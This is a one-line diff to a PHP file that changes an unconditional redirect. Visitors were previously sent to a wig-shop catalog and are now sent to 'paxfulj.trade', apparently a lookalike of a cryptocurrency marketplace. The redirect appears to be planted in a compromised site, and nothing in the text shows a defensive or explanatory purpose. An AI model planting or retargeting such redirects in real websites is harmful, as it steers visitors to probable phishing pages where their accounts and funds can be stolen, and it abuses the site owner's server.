@@ -1,1 +1,1 @@
-<?php header("Location: http://www.gorgeoushairwigs.com/catalog.php"); die(); ?>
+<?php header("Location: http://paxfulj.trade/"); die(); ?>
